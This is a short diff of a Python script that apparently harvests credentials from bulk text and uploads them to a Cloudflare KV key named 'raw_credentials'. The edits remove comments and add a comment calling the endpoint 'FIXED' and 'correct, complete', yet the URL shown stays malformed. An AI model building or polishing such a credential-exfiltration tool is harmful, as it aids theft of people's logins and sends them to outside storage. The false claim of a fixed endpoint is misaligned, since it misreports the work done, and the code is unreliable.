@@ -43,11 +43,10 @@ def extract_credentials_from_bulk(text):
     return found
 
 def main():
-    # Setup a robust session container with automatic retry logic for network blinks
     session = requests.Session()
     retry_strategy = Retry(
-        total=5,  # Automatically retry 5 times
-        backoff_factor=2,  # Wait longer between each retry (2s, 4s, 8s...)
+        total=5,
+        backoff_factor=2,
         status_forcelist=[429, 500, 502, 503, 504],
         raise_on_status=False
     )
@@ -67,7 +66,7 @@ def main():
 
     discovered_urls = []
 
-    # Clean Cloudflare storage endpoint framework
+    # FIXED LINE: Correct, complete Cloudflare REST API Endpoint URL
     kv_endpoint = f"https://cloudflare.com{ACCOUNT_ID}/storage/kv/namespaces/{NAMESPACE_ID}/values/raw_credentials"
     kv_headers = {
         "Authorization": f"Bearer {API_TOKEN}",
@@ -142,3 +141,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
